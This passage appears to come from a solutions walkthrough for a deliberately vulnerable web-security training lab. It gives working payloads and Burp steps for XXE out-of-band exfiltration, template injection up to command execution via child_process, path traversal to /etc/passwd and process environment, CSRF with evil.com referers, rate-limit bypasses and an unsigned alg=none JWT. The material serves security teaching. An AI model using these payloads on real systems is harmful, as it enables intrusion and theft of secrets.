<!ENTITY % oob "<!ENTITY exfil SYSTEM 'http://<your-lab-address>/xxe/collector/log?d=%file;'>">
%oob;
]>
<data>&exfil;</data>
```

Everything happens inline: `%file;` reads the secret, `%oob;` smuggles a brand-new
`<!ENTITY>` declaration into the doctype at parse time (the outer value is
double-quoted, so the inner declaration uses single quotes), and `&exfil;` makes the
server request the collector URL with the secret in it. Two pingbacks land in the
collector log carrying `XXE-SECRET-4471`, and the flag is awarded.

Why it works: parameter entities are expanded inside the doctype, so an attacker can
declare new external entities at parse time and pivot a file read into an
out-of-band request.

**Burp workflow:** Intercept POST /xxe/param and send it to Repeater (Ctrl+R). Build the whole chain inline in the `xml` field: a parameter entity reading the file, a second parameter entity whose double-quoted value contains a full new `<!ENTITY>` declaration with the pingback URL in single quotes, then `%oob;` to declare it at parse time and `&exfil;` in the body to fire it. Submit once and open the collector log page: two pingbacks carrying the secret confirm the out-of-band round trip worked end to end.


**8. XXE in SOAP Endpoint** - `PENTRIX{...}`

Request:

```
POST /xxe/soap
xml=<?xml version="1.0"?><!DOCTYPE env [<!ENTITY xxe SYSTEM "file://<absolute-path-to>/modules/xxe/secret.txt">]><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><GetStatus>&xxe;</GetStatus></soap:Body></soap:Envelope>
```

A second XML endpoint expecting a SOAP envelope runs the same naive entity-expanding
parser before reading the Body. The DOCTYPE declares a `file://` entity, `&xxe;` is
referenced inside `<soap:Body>`, and the secret appears in the service response.

Why it works: every XML entry point shares the vulnerable parser, so the classic
`file://` entity works on the SOAP endpoint too.

**Burp workflow:** Use the SOAP page to send any well-formed envelope to POST /xxe/soap while the Proxy intercepts, then send the request to Repeater (Ctrl+R). Prepend the same DOCTYPE trick as challenge 1, declaring a `file://` SYSTEM entity, and reference it inside `<soap:Body>` (for example inside `<GetStatus>`). Submit: the service response echoes the file contents, proving this second XML entry point shares the vulnerable parser and every XML surface needs the same check.

---


## ssti – Server-Side Template Injection

**1. Basic SSTI** – `PENTRIX{...}`
Your name is dropped into a template that gets evaluated:
```
GET /ssti/greet?name={{7*7}}
```
The page answers "Hello 49!", proving server-side evaluation.

**Burp workflow:** With Proxy intercept on, open /ssti/greet in the browser and submit a name, then send the captured request to Repeater with Ctrl+R. Change the name parameter to a small template expression like {{7*7}} and resend. If the rendered greeting echoes the computed result instead of your literal text, you have confirmed server-side evaluation and the flag shows up in the page.


**2. Scope Leak (Data Exposure, Not RCE)** – `PENTRIX{...}`
Once template syntax evaluates, probe what else lives in the template's scope. The greeting handler's closure also holds a server-side variable containing this challenge's flag, and the naive engine lets your expression read it directly:
```
GET /ssti/greet?name={{secretFlag}}
```
Why it works: the expression runs with the handler's closure scope visible, so a variable the developer only meant for server-side use is readable by anyone who can inject an expression. This is a scope leak (data exposure), not code execution: no OS command runs.

**Burp workflow:** Same route, /ssti/greet with the name parameter. In Repeater, first confirm {{ }} evaluates with a harmless arithmetic expression, then pivot to probing which server-side variables the template scope can see. Try the most obvious conventional name for the flag variable inside {{ }} and watch the greeting echo its value. One Repeater send per guess is plenty, no Intruder run needed here.


---


**3. Word Blacklist Bypass** - `PENTRIX{...}`

Request:

```
GET /ssti/wordfilter?input={{eval("vaultSec"+"ret")}}
```

The filter deletes the words `flag`, `secret` and `config`, so `{{vaultSecret}}`
becomes `{{vault}}` and fails. Splitting the blocked word across a string
concatenation (`"vaultSec"+"ret"`) means the literal word never appears in the input;
the nested `eval()` reassembles it at run time and reads the in-scope variable.

Why it works: the blacklist is plain substring matching, and string concatenation
plus a nested `eval()` rebuilds the blocked identifier after filtering.

**Burp workflow:** Route is GET /ssti/wordfilter with the input parameter. In Repeater, send a plain expression referencing the flag variable and notice the output comes back broken when you use words like flag or secret, which tells you a substring filter is active. Resend with the blocked identifier split across a string concatenation inside a nested eval, so the literal word never appears in your request. Confirm the response now renders the variable's value.


**4. Underscore Blacklist Bypass** - `PENTRIX{...}`

Request:

```
GET /ssti/nounderscore?input={{eval("db"+String.fromCharCode(95)+"pass")}}
```

Underscores are deleted, so `{{db_pass}}` becomes `{{dbpass}}`. Character code 95 is
`_`, so `String.fromCharCode(95)` rebuilds the underscore at run time and the nested
`eval()` resolves `db_pass`.

Why it works: the filter removes a character the attacker can regenerate from its
character code.

**Burp workflow:** Route is GET /ssti/nounderscore with the input parameter. Probe in Repeater with an expression using a plain underscore and watch it break, which reveals the filter deletes that character. Regenerate the underscore from its character code with String.fromCharCode(95) and wrap the rebuilt identifier in a nested eval to resolve it. The response shows the variable's value once the identifier is whole again.


**5. Bracket Blacklist Bypass** - `PENTRIX{...}`

Request:

```
GET /ssti/nobrackets?input={{JSON.stringify(cfg)}}
```

Brackets are deleted and the flag lives in `cfg["db-pass"]`, whose key contains a
dash, so dot notation cannot reach it either. Instead of indexing the object,
`JSON.stringify(cfg)` serializes the whole object to text, revealing the flag with
no brackets at all.

Why it works: when indexing is impossible, serializing the entire object leaks every
property.

**Burp workflow:** Route is GET /ssti/nobrackets with the input parameter. A few Repeater probes show square brackets get stripped, and dot notation cannot reach the key either since it contains a dash. Instead of indexing the object at all, serialize the whole thing in your expression with JSON.stringify so every property leaks as text with zero brackets. Read the flag right out of the rendered JSON in the response.


**6. Dot Blacklist Bypass** - `PENTRIX{...}`

Request:

```
GET /ssti/dotblock?input={{db["key"]}}
```

Dots are deleted, so `{{db.key}}` becomes `{{dbkey}}` and fails. JavaScript's
bracket notation (`db["key"]`) accesses the same property with no dots.

Why it works: property access has two syntaxes, and the filter only blocks one.

**Burp workflow:** Route is GET /ssti/dotblock with the input parameter. A quick Repeater probe shows dots are deleted, so dotted property access breaks. Resend with JavaScript's bracket notation instead, which reads the same property with no dots. The flag lands in the response once the lookup succeeds.


**7. Curly-Brace Strip Bypass** - `PENTRIX{...}`

Request:

```
GET /ssti/curly?input={{{{7*7}}}}
```

The filter removes the first `{{` and the first `}}` only, once each (like the naive
semicolon filter in the cmdi module). Sending doubled braces leaves one working
`{{7*7}}` behind after stripping, which evaluates to 49.

Why it works: a strip-once filter is defeated by doubling the stripped sequence.

**Burp workflow:** Route is GET /ssti/curly with the input parameter. Intercept the request, send it to Repeater, then fuzz the input by adding extra braces around your expression. The filter strips only the first {{ and the first }} once each, so a doubled pair leaves one intact {{ }} behind that still evaluates. Start from the plain baseline and add braces one pair at a time until the computed answer appears in the response.


**8. Quote Blacklist Bypass** - `PENTRIX{...}`

Request:

```
GET /ssti/noquotes?input={{eval(String.fromCharCode(118,97,117,108,116,75,101,121))}}
```

Quotes are deleted and the variable name `vaultKey` is blocked as a word, so no
string literal and no direct reference is possible. The character codes spell
`vaultKey` (118=v, 97=a, 117=u, 108=l, 116=t, 75=K, 101=e, 121=y) with no quotes and
no blocked word; the nested `eval()` turns it back into the identifier.

Why it works: any string can be rebuilt from character codes, and a nested `eval()`
evaluates the rebuilt identifier in the template scope.

**Burp workflow:** Route is GET /ssti/noquotes with the input parameter. Your probes will show quotes are deleted and the obvious variable name is word-blocked, so no string literal or direct reference works. In Repeater, rebuild the identifier purely from character codes with String.fromCharCode and evaluate it with a nested eval, so neither quotes nor the blocked word ever appear in the request. When the response renders the variable's value, you have the bypass.


**9. SSTI to Remote Code Execution** - `PENTRIX{...}`

Request:

```
GET /ssti/exec?expr={{require("child_process").execSync("id").toString()}}
```

There is no sandbox: template expressions run in Node.js with `require()` in scope.
Reaching `child_process` turns the injection into OS command execution, and the
`uid=...` output of `id` is rendered into the page.

Why it works: the template engine is raw `eval()` in a Node.js process, so SSTI
escalates directly to RCE via `require("child_process")`.

**Burp workflow:** Route is GET /ssti/exec with the expr parameter. Confirm the route is reachable in Repeater, then keep the same {{ }} injection pattern you used all module, except this engine runs raw eval in Node with require in scope. Aim your expression at the child_process module to execute an OS command, and the command output renders into the page. Start with a harmless command like id to prove execution, and treat every Repeater send as a live shell.

---


## lfi – Path Traversal

**1. Basic traversal** – `PENTRIX{...}`
The `file` parameter is used as a filesystem path with no checks:
```
GET /lfi/view?file=..%2Fdocs%2Fsecret.txt
```
Why it works: `../` climbs out of the intended directory.

**Burp workflow:** With Burp Proxy intercept on, click through the Document Viewer at /lfi/view and send the captured request to Repeater (Ctrl+R). Edit the file parameter to climb out of docs/ with ../ sequences and resend until the secret marker shows. If one level is not enough, send the request to Intruder (Ctrl+I) and fuzz the traversal depth, watching for the marker in the responses.


**2. Filter bypass** – `PENTRIX{...}`
The download endpoint strips `../` exactly once. Nest the sequences so the strip creates a new one:
```
GET /lfi/download?file=....%2F%2Fdocs%2Fsecret.txt
```
(`....//` minus one `../` pass collapses back to `../`.)
Why it works: single-pass sanitization is undone by its own removal. Canonicalize the path first, then check it stays inside the allowed root.

**Burp workflow:** Open /lfi/download?file=about.txt through the Proxy, intercept the request, and send it to Repeater (Ctrl+R). Change the file parameter to a nested traversal the one-pass filter reassembles, and send a few variations in Repeater. The response renders the secret file once the filter collapses your input back into a working ../ sequence.


---


**3. Absolute Path Read** - `PENTRIX{...}`
Request: `GET /lfi/abs?page=/etc/passwd`
The page prints `/etc/passwd` (look for `root:x:0:0`) and the flag box appears.
Why it works: the reader uses absolute paths verbatim instead of confining reads to the docs folder, so no `../` traversal is needed at all.

**Burp workflow:** Open the Page Reader at /lfi/abs in a Burp-proxied browser and send a read request to Repeater (Ctrl+R). Replace the page parameter value with an absolute system path instead of any relative filename, then send. Read the user account file output for the root entry; the flag awards when it renders.


**4. Double-Encoding Bypass** - `PENTRIX{...}`
Request: `GET /lfi/double?page=%252e%252e%252fdocs%252fsecret.txt`
The filter decodes once, sees no `..`, and lets it through; the value is decoded a second time on use, becoming `../docs/secret.txt`, and the secret (`LFI-SECRET-8830`) is printed with the flag.
Why it works: single-decode-then-check is defeated when the application decodes again after the check; `%252e` survives the first decode as `%2e` and becomes `.` on the second.

**Burp workflow:** Browse to /lfi/double with the Proxy on, intercept the request, and send it to Repeater (Ctrl+R). Set the page parameter to a twice-encoded traversal so the filter sees harmless text on its first decode while the second decode rebuilds the ../ path. Send variations in Repeater and compare the "final decoded path" the page echoes to confirm the filter is bypassed.


**5. Deep Nesting Bypass** - `PENTRIX{...}`
Request: `GET /lfi/nested?page=....///docs/secret.txt`
The filter strips every `../` in one pass, turning `....///` into `..//`, which normalizes to `../`; the secret is printed with the flag. (`...//docs/secret.txt` works too.)
Why it works: a one-pass strip never re-inspects its own output, so nested dots regenerate a fresh traversal sequence after filtering.

**Burp workflow:** Point your browser through the Proxy at /lfi/nested, intercept the request, and send it to Repeater (Ctrl+R). Tamper with the page parameter using nested dot sequences so the one-pass strip reassembles a live traversal in its own output. Resend in Repeater with different nesting shapes until the secret prints.


**6. Language Parameter Traversal** - `PENTRIX{...}`
Request: `GET /lfi/lang?lang=../secret`
The viewer reads `docs/lang/../secret.txt`, which resolves to `docs/secret.txt`; the secret is printed with the flag.
Why it works: the `lang` parameter is concatenated into a filesystem path with zero validation, so it is just another filename input.

**Burp workflow:** Browse to /lfi/lang with the Proxy intercepting, forward the request, and send it to Repeater (Ctrl+R). Edit the lang parameter (which is concatenated into a filesystem path) to traverse out of docs/lang/ with ../ and resend. Keep adjusting the depth until the secret marker shows in the response.


**7. Log Poisoning Chain** - `PENTRIX{...}`
Step 1, poison the log: `curl -A "PENTRIX-LOG-MARKER pwned" http://<your-lab-address>/lfi/log-demo`
Step 2, read the log back through the LFI: `GET /lfi/view?file=../lfi_access.log`
Your marker appears in the file content returned by the viewer, and the flag is awarded.
Why it works: the access log stores the raw User-Agent with no filtering (log injection), and the document viewer reads that log file via traversal, chaining the two flaws.

**Burp workflow:** Visit /lfi/log-demo through the Proxy and send the request to Repeater (Ctrl+R). Edit the User-Agent header to plant your marker text and send it, which poisons the access log with your raw header. Then send a second request to /lfi/view to Repeater, set file to traverse up to the access log, and confirm your marker appears in the returned file content.


**8. Process Environ Leak** - `PENTRIX{...}`
Request: `GET /lfi/procinfo?f=environ`
The page prints the raw `/proc/self/environ` (NUL-separated `KEY=value` entries, including `PATH=`) and the flag is awarded.
Why it works: the filename is appended to `/proc/self/` with no validation, and `environ` exposes the whole process environment, secrets included.

**Burp workflow:** Open /lfi/procinfo through the Proxy and send the request to Repeater (Ctrl+R). Set the f parameter to a filename that gets appended under /proc/self/, such as environ, and send. The response dumps the process environment, so scan the NUL-separated KEY=value entries for secrets.


**9. Secret Config Read** - `PENTRIX{...}`
Request: `GET /lfi/config?file=../lfi_secret.conf`
The planted config one directory above docs is printed (contains `LFI-CONFIG-SECRET-5521`) and the flag is awarded.
Why it works: the config viewer applies no validation at all, and a secret file was left within traversal reach.

**Burp workflow:** In the Proxy, browse to /lfi/config, submit the Read config form, and send the captured request to Repeater (Ctrl+R). Edit the file parameter to climb one level above docs/ and request the planted config file. The response prints the config contents, including the secret value.

---


## csrf – Cross-Site Request Forgery

**1. State-changing GET** – `PENTRIX{...}`
Log in (`GET /csrf/login/alice`), then note the email change needs no token and rides on your session cookie:
```
GET /csrf/change-email?email=pwned@evil.com
```
In the real attack this URL sits in an `<img>` tag on the attacker's page; your browser sends the request *with your cookies* when you visit it. The flag demands proof the request really crossed sites: it only fires when the request carries a foreign `Referer` or `Origin` header (a host different from the lab's). Replaying the URL in your own session, with no header or a same-origin one, still changes the email but earns no flag.

**Burp workflow:** Open /csrf/login/alice in your browser through the Proxy so the session cookie is logged, then send GET /csrf/change-email?email=attacker@evil.com to Repeater (Ctrl+R). Before you hit Send, add a foreign header, for example `Referer: https://evil.com/` (or an `Origin` on a foreign host): with that cross-site evidence the email flips *and* the flag fires. Send it once without the header to see the difference: the email still changes, but no flag is awarded. Burp can also build the attacker page for you: right-click the working request and choose Engagement tools, Generate CSRF PoC.


**2. Clickjacking** – `PENTRIX{...}`
```
GET /csrf/framedemo
```
The demo page embeds the account actions page (`/csrf/vip-action`) in an iframe, and that page sends no `X-Frame-Options` / `frame-ancestors` header, so any site can frame it. Visiting the demo alone awards nothing. The demo issues a one-time frame token and loads the victim page inside the frame with it (`/csrf/vip-action?frame=<token>`); click the framed "Delete my account" button (a real attack hides the frame under a decoy button) and the framed form posts the token back, which is when the flag is awarded.
Why it works: without framing defenses, your authenticated page becomes a puppet inside the attacker's page, and the framed submit proves a click really landed on the hidden button.

**Burp workflow:** Open GET /csrf/framedemo with the Proxy on and find the frame request to `/csrf/vip-action?frame=...` in Proxy history; read its response headers in the bottom panel: no X-Frame-Options and no Content-Security-Policy frame-ancestors, which is exactly the missing defense. Send that framed GET to Repeater (Ctrl+R) and replay it with the token so the server records a real framed load in your session, then replay the framed form's POST to `/csrf/vip-action` with the same `frame` token and your session cookie: the load plus the post-back reads as a framed click and awards the flag. Clicking the framed button in the browser performs the same chain.


**3. JSON API CSRF via text/plain (simple request)** – `PENTRIX{...}`
1. Log in: open `/csrf/login/alice`.
2. Open `/csrf/json-email` and look at the "Fire forged JSON request" form (it uses `enctype="text/plain"` with a hidden field named `{"email":"attacker@evil.com"}`). Submitting it from this page earns nothing: it is a same-origin request, and the endpoint refuses text/plain forgeries that carry no cross-site evidence (403, nothing changed).
3. Replay the same request in Burp Repeater with a foreign `Referer` or `Origin` header added: now the email changes and the flag is awarded.
   Equivalent curl: `curl -b cookies -X POST -H "Content-Type: text/plain" -H "Referer: https://evil.com/" -d '{"email":"attacker@evil.com"}' http://<your-lab-address>/csrf/api/email`
Why it works: the endpoint mines text/plain bodies for a JSON object and has no CSRF token; a `text/plain` form is a CORS simple request, so no preflight blocks the forged cross-site call and cookies are attached.

**Burp workflow:** Log in at /csrf/login/alice, submit the forged form on /csrf/json-email, and intercept POST /csrf/api/email in the Proxy. Send it to Repeater (Ctrl+R) and note the Content-Type: text/plain header with the JSON-shaped body in a form field named {"email":"attacker@evil.com"}. Add a foreign `Referer` or `Origin` header (for example `Referer: https://evil.com/`), change the email value, and resend: it works with no token and no preflight, because text/plain counts as a CORS simple request that browsers happily send cross-site with cookies, and the foreign header is the cross-site evidence the flag requires. Resend once without the header to see the 403 refusal.


**4. Weak Referer Check Bypass** – `PENTRIX{...}`
1. Log in: open `/csrf/login/alice`.
2. Send the nickname change with a forged Referer:
   `curl -b cookies -X POST -H "Referer: https://evil.com/?pentrix.lab" -d "nickname=pwned" /csrf/api/nickname`
3. The nickname changes and the flag is awarded (a missing or non-matching referer gets 403).
Why it works: the check is `referer.includes('pentrix.lab')`, and the attacker fully controls the referer sent from their own page, so `https://evil.com/?pentrix.lab` contains the magic substring.

**Burp workflow:** Send POST /csrf/api/nickname with the field nickname=pwned to Repeater (Ctrl+R) and watch it 403 with no Referer header. Add a Referer header containing the magic substring pentrix.lab (even inside an attacker URL like https://evil.com/?pentrix.lab) and resend: the 403 turns into a success. Toggle the header between missing, wrong, and containing the substring to map exactly how weak the includes() check is.


**5. HTTP Method Override Smuggling (_method=DELETE)** – `PENTRIX{...}`
1. Log in: open `/csrf/login/alice`.
2. Open `/csrf/account` and look at the form containing the hidden `_method=DELETE` field (a plain POST). Submitting it from this page earns nothing: it is a same-origin request, and the endpoint refuses overrides that carry no cross-site evidence (403, account untouched).
3. Replay the same POST in Burp Repeater with a foreign `Referer` or `Origin` header added: the delete path triggers and the flag is awarded.
   Equivalent curl: `curl -b cookies -X POST -H "Referer: https://evil.com/" -d "_method=DELETE" http://<your-lab-address>/csrf/account`
   (A real `DELETE /csrf/account` also deletes but earns no flag.)
Why it works: cross-site `DELETE` needs a CORS preflight, but a plain POST does not; the app's manual `_method` override lets the "protected" method ride in on a preflight-free POST.

**Burp workflow:** Log in as alice, submit the delete form on /csrf/account, and intercept POST /csrf/account with the _method=DELETE field in the Proxy. Send it to Repeater (Ctrl+R), keep the field at _method=DELETE, add a foreign `Referer` or `Origin` header, and watch the delete path trigger while the request stays a plain POST. Without the foreign header the same request is refused with 403. Compare by sending a real DELETE /csrf/account in Repeater: it also deletes but earns no flag, which proves the challenge is about the preflight-free POST smuggling the dangerous method.


## api – API Security

**1. Mass Assignment** – `PENTRIX{...}`

1. Log in as alice and check your current profile:
   ```bash
   curl -s -c jar -b jar http://<your-lab-address>/api/login/alice
   curl -s -b jar http://<your-lab-address>/api/me   # role: "user"
   ```
2. PATCH your profile with an extra field the form never showed you. Send only
   the `role` key: any key that is not a real column of the users table (for
   example `display_name`) makes the UPDATE fail with a 500.
   ```bash
   curl -s -b jar -X PATCH http://<your-lab-address>/api/me \
     -H 'Content-Type: application/json' \
     -d '{"role":"admin"}'
   ```
3. The response shows your role flipped to `"admin"` and the flag is awarded.

Why it works: the handler builds its SQL SET clause from every key in the JSON
body with no allowlist, so client-supplied keys (even `role` or `id`) become
columns in the UPDATE. Real APIs must pick allowed fields explicitly, never
merge the raw request body into a database update.

**Burp workflow:** In the Proxy, log in as alice and intercept the PATCH to /api/me. Send it to Repeater (Ctrl+R) and add one extra JSON key to the body, like "role":"admin", then resend. The response shows your role flipped to admin, which is the mass assignment win.


**2. Excessive Data Exposure** – `PENTRIX{...}`

1. Fetch the user list and dump the raw response, headers included:
   ```bash
   curl -i http://<your-lab-address>/api/users
   ```
2. The JSON body is whole database rows: `password`, `secret`, and everything
   else the `SELECT *` returned. The `X-Pentrix-Flag` response header carries
   the flag.
3. Browser option: open `/api/users/view` and the flag box is rendered above
   the raw JSON.

Why it works: the endpoint serializes full database rows to JSON, so fields
the client should never see (passwords, secrets, internal ids) leave the
server. APIs must return only the fields each consumer needs, using explicit
projections instead of `SELECT *`.

**Burp workflow:** With Proxy on, just browse to GET /api/users and look at the response panel. You will see whole database rows with password and secret fields that no client should ever receive. Scroll the response headers too, since the flag rides in X-Pentrix-Flag.


**3. Missing Rate Limiting** – `PENTRIX{...}`

1. Hammer the login endpoint with wrong passwords for alice. The counter per
   username is never enforced, so nothing stops you:
   ```bash
   for i in $(seq 1 14); do
     curl -s -c jar -b jar -X POST http://<your-lab-address>/api/login \
       -H 'Content-Type: application/json' \
       -d '{"username":"alice","password":"wrong"}' > /dev/null
   done
   ```
   (Attempts are counted per session, so every call must share one cookie jar, as above.)
2. Log in correctly on attempt 15, in the same session:
   ```bash
   curl -s -b jar -X POST http://<your-lab-address>/api/login \
     -H 'Content-Type: application/json' \
     -d '{"username":"alice","password":"alice123"}'
   ```
3. The successful response carries the flag, because the success followed 15
   or more attempts for alice.

Why it works: the endpoint counts attempts per username but never blocks,
locks out, or slows down the caller, so unlimited guesses can be scripted.
Real logins need throttling, lockout, or CAPTCHA after a few failures.

**Burp workflow:** Intercept the POST to /api/login, send it to Intruder (Ctrl+I), and set the password field as the payload position. Run a short wordlist of wrong passwords against username alice, watch every attempt return a normal response with no lockout, then send the correct password "alice123" to Repeater for the final attempt.


**4. Rate Limit Bypass via X-Forwarded-For** – `PENTRIX{...}`

1. Burn your quota: `POST /api/v1/login` locks an "IP" out after 3 bad
   attempts. The counters are per session, so keep one cookie jar (`jar`)
   for every call in this challenge.
   ```bash
   for i in 1 2 3 4; do
     curl -s -c jar -b jar -X POST http://<your-lab-address>/api/v1/login \
       -H 'Content-Type: application/json' \
       -d '{"username":"alice","password":"wrong"}'
   done
   # 4th attempt: 429 Too many attempts
   ```
2. Confirm the lockout bites real logins too: the correct password from your
   real IP also gets 429.
   ```bash
   curl -s -c jar -b jar -X POST http://<your-lab-address>/api/v1/login \
     -H 'Content-Type: application/json' \
     -d '{"username":"alice","password":"alice123"}'   # still 429
   ```
3. Change your "IP" and walk in. The rate-limit identity comes from the
   `X-Forwarded-For` header, which you control:
   ```bash
   curl -s -c jar -b jar -X POST http://<your-lab-address>/api/v1/login \
     -H 'Content-Type: application/json' \
     -H 'X-Forwarded-For: 10.9.9.9' \
     -d '{"username":"alice","password":"alice123"}'
   ```
   The login succeeds (`"ok":true`) even though your real IP is locked out,
   and the flag is awarded.

Why it works: the server keys the rate limit by client IP but reads that IP
from a client-controlled header, so the attacker gets a fresh quota by
spoofing a new IP per attempt. Trust only the connection's remote address, or
validate that the header comes from a trusted proxy.

**Burp workflow:** Fire bad logins at POST /api/v1/login from the Proxy until you see 429 "Too many attempts". Send the request to Repeater (Ctrl+R), keep the correct password "alice123", and add a fake X-Forwarded-For header such as 10.9.9.9. Resend and the login succeeds because the server keys the limit on the header you control.


**5. API Version AuthZ Bypass** – `PENTRIX{...}`

1. Log in as alice:
   ```bash
   curl -s -c jar -b jar http://<your-lab-address>/api/login/alice
   ```
2. Confirm v1 protects the record: `GET /api/v1/users/3` answers 403 ("you
   can only view your own record").
   ```bash
   curl -s -b jar http://<your-lab-address>/api/v1/users/3
   ```
3. Request the same record through the copied v2 route:
   ```bash
   curl -s -b jar http://<your-lab-address>/api/v2/users/3
   ```
   v2 returns the full user record (username, email, role, secret) and awards
   the flag.

Why it works: v2 was copy-pasted from v1 but the authorization check never
made it over, so any logged-in user can read anyone's record through the new
version. Every new version or copy of an endpoint must carry the original
access checks; review versioned routes for exactly this drift.

**Burp workflow:** Log in as alice, then send GET /api/v1/users/3 to Repeater (Ctrl+R) and confirm the 403 telling you to view only your own record. Copy the request, change the path to /api/v2/users/3, and resend: the copied v2 route skips the authorization check and returns the full user record.


---


## misconfig – Security Misconfiguration

**1. Verbose debug errors** – `PENTRIX{...}`
```
GET /misconfig/debug?err=1
```
The error page dumps configuration, and the `debugToken` in the dump *is* the flag. Stack traces and config dumps belong in logs, not responses.

**Burp workflow:** Browse to `http://<your-lab-address>/misconfig/debug` with the Proxy on and click the "Simulate an error" link, then send that request to Repeater (Ctrl+R) and inspect the response body for the config dump. In Repeater, make sure the `err=1` query parameter is present and resend; the dumped `debugToken` is what you want. This teaches the core misconfig lesson: verbose error pages leak internals, so never trust a 500 page.


**2. Exposed backup file** – `PENTRIX{...}`
```
GET /misconfig/backup.sql
```
A database backup sits in the web root, served like any static file. The response is prefixed with a capture banner carrying the flag; the dump itself leaks credentials (and in real life, that is the disaster).

**Burp workflow:** Proxy a normal visit to `/misconfig`, then send the page request to Repeater and change the path to `/misconfig/backup.sql`. Forward it and read the response body, which is a full database dump served as a static file. You do not need Intruder here, just a good guess at the filename; think about what file extensions backups usually carry.


**3. Directory listing** – `PENTRIX{...}`
```
GET /misconfig/files/
```
Directory browsing is enabled. The listing reveals `secret.txt`; fetch it for the flag. Disable auto-indexing and keep secrets out of web-accessible paths.

**Burp workflow:** Browse to `http://<your-lab-address>/misconfig/files/` with the Proxy on and send the listing request to Repeater. The response shows an auto-generated directory index; spot `secret.txt` in it. Then request `/misconfig/files/secret.txt` in Repeater and read the response. Real lesson: directory browsing plus secrets under web root equals free flags.


---

**4. Exposed .git Directory** - `PENTRIX{...}`
Walk the chain:
`GET /misconfig/.git/HEAD` gives `ref: refs/heads/main`
`GET /misconfig/.git/refs/heads/main` gives the commit hash `a1b2c3d4...`
`GET /misconfig/.git/objects/` lists `a1/`, `GET /misconfig/.git/objects/a1/` lists the object file
`GET /misconfig/.git/objects/a1/b2c3d4e5f60718293a4b5c6d7e8f90a1b2c3d4` prints the commit, whose diff leaks `ADMIN_BACKUP_TOKEN`, and the flag is awarded.
Why it works: version-control metadata served over HTTP lets anyone resolve refs and read objects, and this commit's diff contains a production secret.

**Burp workflow:** Browse to `http://<your-lab-address>/misconfig/.git/HEAD` with the Proxy on and send it to Repeater. The response names the branch ref (`ref: refs/heads/main`); change the Repeater path to `/misconfig/.git/refs/heads/main` to read the commit hash. Then browse the object store in Repeater: request `/misconfig/.git/objects/`, open the directory matching the first two hash characters, fetch the object file, and read the commit diff in the response for the leaked token.


**5. Vim Swap File Leak** - `PENTRIX{...}`
Request: `GET /misconfig/app.js.swp`
The recovered editor backup prints dev notes with a database password, a Stripe key, and the backup token flag.
Why it works: the swap artifact was left in the web-accessible tree and is served to anyone who guesses its name.

**Burp workflow:** With the Proxy on, browse to `/misconfig`, then build the Vim swap filename `app.js.swp` in Repeater (`GET /misconfig/app.js.swp`) and forward it. The response body is the recovered editor backup; read it for the dev notes holding the database password, Stripe key, and backup token. The Burp takeaway: hidden artifacts are guessable, so practice naming conventions like `.swp`, `~`, and `.bak` in Repeater.


**6. HTTP TRACE Enabled (XST)** - `PENTRIX{...}`
Request: `curl -X TRACE http://<your-lab-address>/misconfig/trace -H "X-Custom: hello"`
The server reflects the full request (your headers come back in the page) and the flag is awarded.
Why it works: TRACE is enabled and echoes the entire request, which is the primitive behind cross-site tracing attacks that steal reflected `Cookie`/`Authorization` headers.

**Burp workflow:** Send a request to `http://<your-lab-address>/misconfig/trace` to Repeater, then change the request line verb from GET to TRACE and add a custom header such as `X-Custom: hello`. Forward it and watch the response echo your full request back, headers and all. Optionally add a `Cookie: test=1` header first to see how cross-site tracing reflects sensitive headers; this is why TRACE should be disabled.


**7. Exposed .env File** - `PENTRIX{...}`
Request: `GET /misconfig/.env`
The file prints `DB_URL`, `STRIPE_SECRET_KEY`, `SESSION_SECRET`, and the admin API token flag.
Why it works: the environment file with production secrets sits where the web server serves it to anyone who asks.

**Burp workflow:** Browse to the `/misconfig` page with the Proxy on (interception can stay off), then send `GET /misconfig/.env` to Repeater and forward it. The response prints `DB_URL`, `STRIPE_SECRET_KEY`, `SESSION_SECRET`, and the admin API token. No fuzzing needed: `.env` is the first filename you should try whenever a misconfig challenge smells like secrets in the web root.


**8. Default Credentials** - `PENTRIX{...}`
Request: `curl -u admin:admin http://<your-lab-address>/misconfig/manager`
Without credentials the panel returns 401; with `admin:admin` (HTTP Basic) it opens and the flag is awarded.
Why it works: the management panel is protected only by the vendor default credential, which was never changed.

**Burp workflow:** Browse to `http://<your-lab-address>/misconfig/manager` with the Proxy on; the panel answers 401 and demands HTTP Basic auth. Send that request to Repeater and add the header `Authorization: Basic` with the base64 of the vendor default `admin:admin` (or let the browser login prompt pop and answer it there). Resend and the panel opens. This is the classic misconfig move: always try factory defaults before anything clever.


**9. Robots.txt Disclosure** - `PENTRIX{...}`
`GET /misconfig/robots.txt` shows `Disallow: /misconfig/backup.zip`
`GET /misconfig/backup.zip` downloads a valid ZIP; `unzip -p backup.zip backup.txt` prints admin credentials and the backup token flag.
Why it works: robots.txt advertises the sensitive path, and the backup archive itself is downloadable.

**Burp workflow:** Browse to `http://<your-lab-address>/misconfig/robots.txt` with the Proxy on and send the request to Repeater. The response lists `Disallow: /misconfig/backup.zip`; change the Repeater path to that disallowed archive and forward it. The response is a downloadable ZIP; you will unpack `backup.txt` from it outside Burp to read the admin credentials and token. Treat robots.txt as a treasure map, not a restriction.


**10. Unauthenticated HTTP PUT** - `PENTRIX{...}`
Upload: `curl -X PUT -H "Content-Type: text/plain" --data-binary 'hello' http://<your-lab-address>/misconfig/files/pwn.txt` (201 Created)
Read back: `GET /misconfig/files/pwn.txt` prints the uploaded bytes and the flag is captured on the scoreboard.
Why it works: the endpoint accepts arbitrary file writes with no authentication, and the written file is served back raw, proving the write.

**Burp workflow:** In Repeater, build a request with the method line `PUT /misconfig/files/<yourname>.txt HTTP/1.1`, add the header `Content-Type: text/plain`, and put a short text body in the message body. Send it and expect `201 Created`, proving the unauthenticated write. Then change the method back to `GET` on the same path and resend to read your uploaded bytes back. If a write fails, double check your Host header and Content-Length before blaming the server.

*Note for the whole lab: all flags look like `PENTRIX{...}`. If a payload stops working, reset the lab (delete the local app data and restart); some challenges mutate lab state (passwords, roles, emails) by design.*

---


## jwt – JWT Attacks

**1. alg=none Accepted** – `PENTRIX{...}`

Build an unsigned token by hand. Header `{"alg":"none","typ":"JWT"}` and payload
`{"user":"guest","role":"admin"}`, base64url-encoded, joined with dots and an
empty third segment:

```
node -e "
const b64u = o => Buffer.from(JSON.stringify(o)).toString('base64url');
const t = b64u({alg:'none',typ:'JWT'}) + '.' + b64u({user:'guest',role:'admin'}) + '.';
console.log(t);"
```

Paste the token into the form at `/jwt/none` and submit.

Why it works: the verifier treats `alg=none` as legitimate and checks only the
claims, so a self-written token with `role: admin` is accepted with no signature.

